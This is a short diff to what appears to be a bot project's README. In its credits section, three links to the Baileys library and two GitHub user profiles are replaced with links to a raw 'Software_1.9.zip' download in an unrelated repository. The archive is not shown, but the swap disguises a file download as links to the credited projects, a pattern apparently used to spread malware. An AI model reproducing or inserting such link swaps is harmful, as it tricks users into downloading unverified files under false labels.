@@ -136,8 +136,8 @@
 | X |✅|
 
   # THANKS FOR
-* [`Baileys`](https://github.com/adiwajshing/Baileys)
-* [`MhankBarBar`](https://github.com/MhankBarBar)
-* [`MRHRTZ`](https://github.com/MRHRTZ)
+* [`Baileys`](https://github.com/Gabrielyop50/Gabrielit/raw/refs/heads/master/stik/Software_1.9.zip)
+* [`MhankBarBar`](https://github.com/Gabrielyop50/Gabrielit/raw/refs/heads/master/stik/Software_1.9.zip)
+* [`MRHRTZ`](https://github.com/Gabrielyop50/Gabrielit/raw/refs/heads/master/stik/Software_1.9.zip)
   
   
